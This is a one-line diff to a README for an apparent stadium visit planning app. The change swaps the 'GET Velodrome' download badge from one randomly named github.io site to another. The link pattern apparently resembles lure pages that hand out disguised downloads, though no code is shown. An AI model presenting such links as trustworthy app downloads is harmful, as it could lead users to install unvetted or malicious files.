@@ -1,6 +1,6 @@
 # Stade Velodrome - Stadium Visit and Event Planning App
 
-[![GET Velodrome](https://img.shields.io/badge/GET%20%E2%80%94%20Velodrome-0078D6?style=for-the-badge&logoColor=white)](https://kingsleywilcoxkril.github.io/.github/stade-velodrome)
+[![GET Velodrome](https://img.shields.io/badge/GET%20%E2%80%94%20Velodrome-0078D6?style=for-the-badge&logoColor=white)](https://omariaguilarvfii.github.io/.github/stade-velodrome)
 
 ## Planning Around Velodrome
 
